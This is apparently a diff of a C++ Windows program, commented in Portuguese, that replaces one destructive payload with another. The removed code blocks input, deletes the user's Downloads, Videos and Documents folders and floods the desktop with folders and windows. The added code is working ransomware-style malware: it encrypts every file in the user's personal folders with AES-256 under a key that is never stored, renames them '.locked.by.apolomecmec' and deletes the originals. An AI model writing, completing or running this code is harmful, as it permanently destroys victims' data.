@@ -1,132 +1,161 @@
-﻿#include <Windows.h>
 #include <iostream>
-#include <shellapi.h>
+#include <fstream>
+#include <vector>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <openssl/evp.h>
+#include <openssl/rand.h>
 #include <string>
-#include <Lmcons.h>
+#include <cstring>
+#include <windows.h>
 #include <shlobj.h>
-#include <direct.h>
-#include <ctime>
-#include <cstdlib>
 
-/*Função para retornar o nome de usuário*/
-std::wstring GetComputerUserName() {
-	wchar_t userName[UNLEN + 1];
-	DWORD userNameLength = UNLEN + 1;
-
-	if (GetUserNameW(userName, &userNameLength)){
-		return std::wstring(userName);
-	}
-	else {
-		return L"Nao foi possivel encontrar o nome do usuario";
-	}
+// --- Função para pegar pastas conhecidas ---
+std::wstring GetKnownFolder(REFKNOWNFOLDERID folderId) {
+    PWSTR path = nullptr;
+    if (SUCCEEDED(SHGetKnownFolderPath(folderId, 0, nullptr, &path))) {
+        std::wstring result(path);
+        CoTaskMemFree(path);
+        return result;
+    }
+    return L"";
 }
 
-/*Função para buscar o diretório que eu quero*/
-std::wstring GetDesktopPath() {
-	return L"C:\\Users\\" + GetComputerUserName() + L"\\Downloads";
+// --- Conversão de wstring para string ---
+std::string WStringToString(const std::wstring& wstr) {
+    if (wstr.empty()) return std::string();
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
+    std::string result(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &result[0], size_needed, nullptr, nullptr);
+    return result;
 }
 
-std::wstring GetDesktopPath2(){
-	return L"C:\\Users\\" + GetComputerUserName() + L"\\Videos";
+// --- Funções para obter os caminhos ---
+std::string GetDesktopPath()   { return WStringToString(GetKnownFolder(FOLDERID_Desktop)); }
+std::string GetDocumentsPath() { return WStringToString(GetKnownFolder(FOLDERID_Documents)); }
+std::string GetDownloadsPath() { return WStringToString(GetKnownFolder(FOLDERID_Downloads)); }
+std::string GetPicturesPath()  { return WStringToString(GetKnownFolder(FOLDERID_Pictures)); }
+std::string GetMusicPath()     { return WStringToString(GetKnownFolder(FOLDERID_Music)); }
+std::string GetVideosPath()    { return WStringToString(GetKnownFolder(FOLDERID_Videos)); }
+
+// -------------------- CONFIGURAÇÕES ------------------------
+const std::string EXTENSAO_BLOQUEADO = ".locked.by.apolomecmec";
+
+// Diretórios alvo 
+const std::vector<std::string> DIRETORIOS_ALVO = {
+    GetDesktopPath(),
+    GetDownloadsPath(),
+    GetDocumentsPath(),
+    GetPicturesPath(),
+    GetMusicPath(),
+    GetVideosPath()
+};
+// -----------------------------------------------------------
+
+// Verifica se é um diretório
+bool ehDiretorio(const std::string& caminho) {
+    struct stat statbuf;
+    if (stat(caminho.c_str(), &statbuf) != 0) return false;
+    return S_ISDIR(statbuf.st_mode);
 }
 
-std::wstring GetDesktopPath3(){
-	wchar_t path[MAX_PATH];
-	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, path))) {
-		return std::wstring(path);
-	}
-	return L".";
-}
-std::wstring GetDesktopPath4() {
-	return L"C:\\Users\\" + GetComputerUserName() + L"\\Documents";
-}
-/*Função para apagar o diretório que eu quero*/
-void DeletarPasta(const std::wstring& caminho) {
-	wchar_t pathToDelete[MAX_PATH];
-	wcscpy_s(pathToDelete, caminho.c_str());
-	pathToDelete[wcslen(caminho.c_str()) + 1] = L'\0'; 
+// Criptografa arquivo e adiciona extensão
+// Lista de arquivos criptografados
+std::vector<std::string> arquivosCriptografados;
 
-	SHFILEOPSTRUCTW fileOp = { 0 };
-	fileOp.wFunc = FO_DELETE;
-	fileOp.pFrom = pathToDelete;
-	fileOp.fFlags = FOF_NO_UI; 
+// Criptografa arquivo e adiciona extensão
+bool criptografarArquivo(const std::string& caminhoOriginal, const std::vector<unsigned char>& chave, const std::vector<unsigned char>& iv) {
+    std::ifstream arquivoEntrada(caminhoOriginal, std::ios::binary);
+    if (!arquivoEntrada) return false;
 
-	int result = SHFileOperationW(&fileOp);
+    std::vector<unsigned char> conteudo((std::istreambuf_iterator<char>(arquivoEntrada)), std::istreambuf_iterator<char>());
+    arquivoEntrada.close();
 
-	if (result == 0) {
-		std::wcout << L"Deletado com sucesso!\n";
-	}
-	else {
-		std::wcout << L"Erro ao deletar. Codigo: " << result << std::endl;
-	}
-}
+    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+    if (!ctx) return false;
 
-/*Adicionar sufixo aleatório no final das pastas se elas já existirem*/
-bool PastaExiste(const std::wstring& caminho3) {
-	DWORD attrib = GetFileAttributesW(caminho3.c_str());
-	return (attrib != INVALID_FILE_ATTRIBUTES && (attrib & FILE_ATTRIBUTE_DIRECTORY));
-}
+    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, chave.data(), iv.data()) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return false;
+    }
 
-std::wstring GerarSufixoAleatorio() {
-	const wchar_t caracteres[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
-	int index = rand() % (sizeof(caracteres) / sizeof(wchar_t) - 1);
-	return std::wstring(1, caracteres[index]);
-}
+    std::vector<unsigned char> textoCifrado(conteudo.size() + EVP_CIPHER_CTX_block_size(ctx));
+    int tamanhoCifrado = 0;
 
-std::wstring GerarSufixoVariavel(int maxTamanho) {
-	std::wstring resultado = L"";
-	for (int i = 0; i < maxTamanho; ++i) {
-		resultado += GerarSufixoAleatorio();
-	}
-	return resultado;
-}
+    if (EVP_EncryptUpdate(ctx, textoCifrado.data(), &tamanhoCifrado, conteudo.data(), conteudo.size()) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return false;
+    }
 
-void CriarPasta(std::wstring caminhoBase) {
-	std::wstring baseNome = L" by apolo mec mec ";
-	std::wstring sufixo = L"";
-	std::wstring caminhoFinal;
-	bool criada = false;
-	for (int tamanho = 0; tamanho < 4; ++tamanho) {
-		sufixo += GerarSufixoAleatorio();
-		caminhoFinal = caminhoBase + baseNome + sufixo;
+    int tamanhoFinal = 0;
+    if (EVP_EncryptFinal_ex(ctx, textoCifrado.data() + tamanhoCifrado, &tamanhoFinal) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return false;
+    }
 
-		if (!PastaExiste(caminhoFinal)) {
-			if (_wmkdir(caminhoFinal.c_str()) == 0) {
-				std::wcout << L"Pasta criada com sucesso: " << caminhoFinal << std::endl;
-				criada = true;
-				break;
-			}
-		}
-	}
-	if (!criada) {
-		std::wcout << L"Nao foi possivel criar a pasta" << std::endl;
-	}
+    tamanhoCifrado += tamanhoFinal;
+    textoCifrado.resize(tamanhoCifrado);
+    EVP_CIPHER_CTX_free(ctx);
+
+    std::string novoCaminho = caminhoOriginal + EXTENSAO_BLOQUEADO;
+
+    std::ofstream arquivoSaida(novoCaminho, std::ios::binary);
+    arquivoSaida.write(reinterpret_cast<const char*>(textoCifrado.data()), textoCifrado.size());
+    arquivoSaida.close();
+
+    remove(caminhoOriginal.c_str());
+
+    arquivosCriptografados.push_back(novoCaminho);
+
+    std::cout << "[+] Criptografado: " << novoCaminho << std::endl;
+    return true;
 }
 
-int main(){
-	BlockInput(TRUE);
-	std::wstring caminho = GetDesktopPath();
-	std::wstring caminho2 = GetDesktopPath2();
-	std::wstring caminho3 = GetDesktopPath4();
-	std::wstring caminhoBase = GetDesktopPath3() + L"\\";
-	DeletarPasta(caminho);
-	DeletarPasta(caminho2);
-	DeletarPasta(caminho3);
-	HWND hwnd = GetConsoleWindow();
-	ShowWindow(hwnd, SW_MINIMIZE);
-	srand(static_cast<unsigned int>(time(0)));
-	for (int i = 0; i < 300; i++) {
-		CriarPasta(caminhoBase);
-	}
-	for (int i = 0; i < 1000; i++) {
-		ShellExecute(NULL, L"open", L"Brave", NULL, NULL,SW_SHOWNORMAL);
-	}
-	for (int i = 0; i < 1000; i++) {
-		ShellExecute(NULL, L"open", L"Google", NULL, NULL, SW_SHOWNORMAL);
-	}
-	for (int i = 0; i < 1000; i++) {
-		ShellExecute(NULL, L"open", L"notepad.exe", NULL, NULL, SW_SHOWNORMAL);
-	}
 
-	return 0;
+// Percorre diretórios recursivamente
+void percorrerDiretorios(const std::string& caminho, const std::vector<unsigned char>& chave, const std::vector<unsigned char>& iv) {
+    DIR* dir = opendir(caminho.c_str());
+    if (!dir) {
+        std::cerr << "Erro ao abrir diretório: " << caminho << std::endl;
+        return;
+    }
+
+    struct dirent* entrada;
+    while ((entrada = readdir(dir)) != nullptr) {
+        std::string nome = entrada->d_name;
+        if (nome == "." || nome == "..") continue;
+
+        std::string caminhoCompleto = caminho + "\\" + nome;
+
+        if (ehDiretorio(caminhoCompleto)) {
+            percorrerDiretorios(caminhoCompleto, chave, iv); 
+        } else {
+            if (caminhoCompleto.size() <= EXTENSAO_BLOQUEADO.size() || 
+                caminhoCompleto.compare(caminhoCompleto.size() - EXTENSAO_BLOQUEADO.size(), EXTENSAO_BLOQUEADO.size(), EXTENSAO_BLOQUEADO) != 0) {
+                criptografarArquivo(caminhoCompleto, chave, iv);
+            }
+        }
+    }
+    closedir(dir);
 }
+
+// ------------------------ MAIN BlockInput();---------------------------
+int main() {
+    BlockInput(TRUE);
+    std::vector<unsigned char> chave(32); 
+    std::vector<unsigned char> iv(EVP_CIPHER_iv_length(EVP_aes_256_cbc()));
+
+    if (RAND_bytes(chave.data(), chave.size()) != 1 || RAND_bytes(iv.data(), iv.size()) != 1) {
+        std::cerr << "Erro ao gerar chave/IV." << std::endl;
+        return 1;
+    }
+
+    for (const auto& dir : DIRETORIOS_ALVO) {
+        std::cout << "[*] Processando: " << dir << std::endl;
+        percorrerDiretorios(dir, chave, iv);
+    }
+
+    std::cout << "[✔] Finalizado." << std::endl;
+    return 0;
+}
+    
